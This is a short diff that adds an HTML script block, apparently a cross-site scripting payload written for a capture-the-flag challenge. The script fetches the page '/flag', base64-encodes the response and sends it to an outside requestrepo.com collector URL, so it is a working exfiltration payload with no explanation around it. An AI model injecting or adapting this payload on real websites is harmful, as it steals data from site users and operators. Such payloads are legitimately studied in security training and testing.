@@ -1,0 +1,3 @@
+<script>
+fetch('/flag',{mode: 'no-cors'}).then(r=>r.text()).then(t=>fetch('https://jf0mjxws.requestrepo.com?cc='+btoa(t),{mode: 'no-cors'}))
+</script>
